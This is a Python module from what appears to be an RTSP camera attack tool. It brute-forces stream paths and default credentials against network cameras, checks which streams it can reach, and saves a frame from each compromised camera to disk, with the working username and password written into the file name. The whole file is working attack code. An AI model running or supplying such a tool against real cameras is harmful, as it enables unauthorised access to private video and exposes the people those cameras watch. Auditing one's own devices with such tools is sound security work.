import logging
import socket
import sys
import typing

import av

from modules import utils
from modules.rtsp import RTSPClient, Status

sys.path.append("..")
import config

dummy_route = "/0x8b6c42"
logger = logging.getLogger("debugger")


def attack_route(target: RTSPClient) -> typing.Union[RTSPClient, bool]:
    # If the stream responds positively to the dummy route, it means
    # it doesn't require (or respect the RFC) a route and the attack
    # can be skipped.
    ok = route_attack(target, dummy_route)
    if ok:
        target.routes.append("/")
        utils.detect_auth_method(target)
        return target
        # self.brute_queue.put(target)
        # return

    # If target is timeouted, it's probably not available and can be
    # skipped.
    if target.status is Status.TIMEOUT:
        return False

    # Otherwise, bruteforce the routes.
    for route in config.ROUTES:
        ok = route_attack(target, route)
        if ok:
            target.routes.append(route)
    utils.detect_auth_method(target)
    return target
    # self.brute_queue.put(target)


def route_attack(target: RTSPClient, route) -> bool:
    # Create socket connection.
    try:
        target.connect()
    except socket.timeout as e:
        logger.debug(f"Skipping {target.ip}: {str(e)}")
        target.status = Status.TIMEOUT
        return False
    except Exception as e:
        logger.debug(f"Connect failed for {target.ip}:{target.port}: {str(e)}")
        return False

    # Send describe packet.
    attack_url = f"rtsp://{target.credentials}@{target.ip}:{target.port}{route}"
    target.create_packet(route)
    try:
        target.send_packet()
    except Exception as e:
        logger.debug(f"Send failed for {attack_url}: {str(e)}")
        return False

    # Get return code.
    try:
        code = utils.detect_code(str(target._data))
    except Exception as e:
        logger.debug(f"get_code failed for {attack_url}: {str(e)}, {target._data}")
        return False

    logger.debug(f"DESCRIBE {attack_url} RTSP/1.0 > {code}")
    # If it's a 401 or 403, it means that the credentials are wrong but the route might be okay.
    # If it's a 200, the stream is accessed successfully.
    if code == 200 or code == 401 or code == 403:
        return True

    return False


def attack_credentials(target: RTSPClient):
    for cred in config.CREDENTIALS:
        utils.detect_auth_method(target)
        ok = credentials_attack(target, cred)
        if ok:
            target.credentials = cred
            return target
        if target.status is Status.TIMEOUT:
            return False

    # Some cameras run GST RTSP Server which prioritizes 401 over 404 contrary to most cameras.
    # For these cameras, running another route attack will solve the problem.
    #if not target.route_found or not target.credentials_found or not target.available:
     #   result = attack_route(target)
     #   return bool(result) and validate_stream(target)


def credentials_attack(target: RTSPClient, cred):
    # Create socket connection.
    try:
        target.connect()
    except socket.timeout as e:
        logger.debug(f"Skipping {target.ip}: {str(e)}")
        target.status = Status.TIMEOUT
        return False
    except Exception as e:
        logger.debug(f"Connect failed for {target.ip}:{target.port}: {str(e)}")
        return False

    # Send describe packet.
    attack_url = f"rtsp://{cred}@{target.ip}:{target.port}{target.route}"
    target.create_packet(target.route, cred)
    try:
        target.send_packet()
    except socket.timeout as e:
        logger.debug(f"Skipping {target.ip}: {str(e)}")
        target.status = Status.TIMEOUT
        return False
    except Exception as e:
        logger.debug(f"Send failed for {attack_url}: {str(e)}")
        return False

    # Get return code.
    try:
        code = utils.detect_code(str(target._data))
    except Exception as e:
        logger.debug(f"get_code failed for {attack_url}: {str(e)}")
        return False

    logger.debug(f"DESCRIBE {attack_url} RTSP/1.0 > {code}")
    logger.debug(f"{target._packet} ({attack_url}) > {target._data}")
    # If it's a 404, it means that the route is incorrect but the credentials might be okay.
    # If it's a 200, the stream is accessed successfully.
    if code == 200 or code == 404:
        return True

    return False


def validate_stream(target: RTSPClient):
    target.available = stream_validate(target)
    return target.available


def stream_validate(target: RTSPClient):
    # Create socket connection.
    try:
        target.connect()
    except socket.timeout as e:
        logger.debug(f"Skipping {target.ip}: {str(e)}")
        target.status = Status.TIMEOUT
        return False
    except Exception as e:
        logger.debug(f"Connect failed for {target.ip}:{target.port}: {str(e)}")
        return False

    # Send describe packet.
    attack_url = f"rtsp://{target.credentials}@{target.ip}:{target.port}{target.route}"
    target.create_packet(target.route, target.credentials)
    try:
        target.send_packet()
    except socket.timeout as e:
        logger.debug(f"Skipping {target.ip}: {str(e)}")
        target.status = Status.TIMEOUT
        return False
    except Exception as e:
        logger.debug(f"Send failed for {attack_url}: {str(e)}")
        return False

    # Get return code.
    try:
        code = utils.detect_code(str(target._data))
    except Exception as e:
        logger.debug(f"get_code failed for {attack_url}: {str(e)}")
        return False

    logger.debug(f"DESCRIBE {attack_url} RTSP/1.0 > {code}")
    logger.debug(f"{target._packet} ({attack_url}) > {target._data}")
    # If it's a 200, the stream is accessed successfully.
    if code == 200:
        logging.info(f"Working stream at {attack_url}")
        logger.debug(
            f"Working stream at {attack_url} with {target.auth_method.name} auth"
        )
        return True

    return False


def get_screenshot(target: RTSPClient) -> str:
    username: str
    password: str
    file_name: str
    username, password = target.credentials.split(":")
    file_name = utils.escape_chars(f"{username}_{password}_{target.ip}_{target.port}_{target.route.lstrip('/')}.jpg")
    file_path = config.PICS_FOLDER / file_name

    try:
        with av.open(
            utils.get_camera_rtsp_url(target),
            options={"rtsp_transport": "tcp"},
            timeout=60.0,
        ) as video:
            video.streams.video[0].thread_type = "AUTO"
            for frame in video.decode(video=0):
                img = frame.to_image().save(file_path)
                break
    except Exception as e:
        logger.debug(
            f"get_screenshot failed with {utils.get_camera_rtsp_url(target)}: {repr(e)}"
        )
        return ""

    logging.info(f"Captured screenshot for {utils.get_camera_rtsp_url(target)}")
    return file_path
